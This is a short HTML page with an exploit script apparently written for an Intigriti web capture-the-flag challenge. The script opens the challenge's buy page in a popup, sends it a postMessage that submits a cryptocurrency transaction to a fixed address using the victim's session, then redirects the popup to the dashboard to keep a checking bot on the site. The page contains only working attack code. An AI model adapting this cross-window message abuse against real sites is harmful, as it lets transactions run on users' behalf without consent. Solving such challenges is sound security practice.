<!DOCTYPE html>
<html>
<body>
    <h1>Exploit starting...</h1>
    <script>
        // 1. Open the buy page as a popup to ensure cookies are sent
        const exploiter = window.open("https://challenge-0126.intigriti.io/buy.html?currency=1337COIN&price=1");

        setTimeout(() => {
            // 2. Trigger the transaction
            exploiter.postMessage({
                type: 'submitTransaction',
                transaction: {
                    toAddress: '1ad8f37699d158b520be8f7625df7a5452',
                    currency: '1337COIN',
                    amount: 0.000001
                }
            }, '*');

            // 3. Crucial: Redirect the popup to the dashboard
            // Doing it in the popup keeps the bot "on the same site"
            setTimeout(() => {
                exploiter.location.href = "https://challenge-0126.intigriti.io/dashboard.html";
            }, 2000);
        }, 4000);
    </script>
</body>
</html>
